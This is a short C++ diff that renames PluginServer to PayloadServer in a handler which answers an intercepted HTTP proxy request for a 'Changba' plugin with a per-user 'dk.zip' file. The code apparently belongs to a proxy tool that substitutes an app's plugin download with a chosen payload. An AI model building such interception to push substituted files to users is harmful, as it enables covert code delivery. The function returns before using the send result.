@@ -1,5 +1,5 @@
 #include "changbaPlugin.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 int gDkPluginFlag = 0;
 
@@ -24,7 +24,7 @@ int ChangBaPlugin::replyChangbaPlugin(char * dstbuf, int dstbuflimit, LPHTTPPROX
 	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/zip\r\nContent-Length: %u\r\n\r\n";
 
 	string filename = Public::getUserUrl(lphttp->username, "dk.zip");
-	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+	int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 	return 0;
 	return ret;
 }
